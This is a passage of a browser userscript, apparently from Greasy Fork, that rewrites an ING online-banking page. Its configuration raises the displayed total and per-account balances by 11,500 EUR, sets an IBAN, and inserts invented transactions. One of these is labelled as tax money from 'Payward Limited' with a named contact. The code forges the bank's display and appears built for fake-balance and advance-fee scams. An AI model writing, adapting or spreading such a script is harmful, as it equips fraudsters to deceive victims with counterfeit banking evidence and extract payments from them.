// ==UserScript==
// @name        Ed Combined ING Barbara Guthunz
...
// @match        *://*/*
// @grant       none
// @downloadURL https://update.greasyfork.org/scripts/486837/Ed%20Combined%20ING%20Barbara%20Guthunz.user.js
// @updateURL https://update.greasyfork.org/scripts/486837/Ed%20Combined%20ING%20Barbara%20Guthunz.meta.js
// ==/UserScript==
...
////CONFIGURE/////////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE/////
    ...
    const topGesamtSaldoAdjustmentAmount = 11500;  // Change this to your desired amount

    // Define an array for account balance adjustments
    const accountBalanceAdjustments = [
        { index: 0, amount: 11500},  // Example: change the first account's balance by -1000 EUR
    //    { index: 2, amount: 100 },
        // Add more objects as needed for each account balance adjustment
    ];

    // Specify your IBAN and custom transactions here
    const yourIBAN = 'DE83 5001 0517 0706 4649 30'; // Replace with your IBAN
     // Specify the balance change you want to make (positive for increase, negative for decrease)
    const balanceChange = 11500.0; // Example: decrease balance by 100.00 EUR
    const customTransactions = [
        ...
        {
            recipientName: 'Payward Limited',
            transactionDetails: 'Geld für Steuern. Nur an Andreas Graf wenden.',
